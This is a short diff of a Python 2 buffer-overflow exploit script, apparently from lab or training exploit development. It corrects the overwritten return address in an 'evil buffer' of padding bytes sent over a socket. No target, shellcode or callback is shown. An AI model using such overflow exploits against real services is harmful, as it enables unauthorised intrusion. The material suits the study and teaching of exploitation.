@@ -3,7 +3,7 @@ import socket
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-buffer = 'A'*2606 + '\x8f\x35\x35\x4a\x5f' + 'C'*(2700-2606-4)
+buffer = 'A'*2606 + '\x8f\x35\x4a\x5f' + 'C'*(2700-2606-4)
 
 try:
 	print "\n sending evil buffer..."
